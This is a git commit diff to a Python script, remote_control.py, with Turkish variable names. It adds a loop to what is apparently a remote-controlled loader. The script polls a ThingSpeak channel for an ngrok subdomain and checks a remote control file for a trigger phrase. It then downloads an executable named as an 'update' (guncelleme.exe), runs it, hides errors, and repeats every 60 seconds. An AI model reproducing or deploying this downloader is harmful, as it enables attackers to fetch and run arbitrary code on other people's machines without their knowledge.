105d0c681289a83b4f5df03093437a9d663337de
Mucahit Saratar <trregen222@gmail.com>
2020-03-20 18:11:43 +0300

    Update remote_control.py

--- remote_control.py
+++ remote_control.py
@@ -2,10 +2,8 @@ import os
 import requests as R
 
 
-
-
 def get_data_from_cloud():
-	istek = R.get("https://api.thingspeak.com/channels/<channel-number>/feeds.json?results=1").text
+	istek = R.get("https://api.thingspeak.com/channels/kanal-numarasi/feeds.json?results=1").text
 	dataishere =  istek.split('"field1":"')[-1]
 	subdomain = dataishere.split('","field2":"')[0]
 	return "http://"+subdomain.split('","')[0]+".ngrok.io/guncelleme.exe"
@@ -23,12 +21,31 @@ def download_file(url, filename):
 	localFile.write(u)
 	localFile.close()
 
+def kontrol(url):
+	devam = "etme"
+	u = R.get(url.replace("guncelleme.exe", "kontrol.txt")).content
+	if "devam et krdsm" in u:
+		devam = "et"
+	return devam
+
+
 def runfile(filename):
 	cmd("start " + filename)
 
 
-#while True:
+
+
+
 isim = "tryy.exe"
-adres = get_data_from_cloud()
-download_file(adres, isim)
-runfile(isim)
+while True:
+	adres = get_data_from_cloud()
+	if kontrol(adres) == "et":
+		print "islem basliyor"
+		try:
+			download_file(adres, isim)
+			runfile(isim)
+		except:
+			pass
+	else:
+		print "dogrulama basarisiz 60 saniye timeout olucak"
+	time.sleep(60)
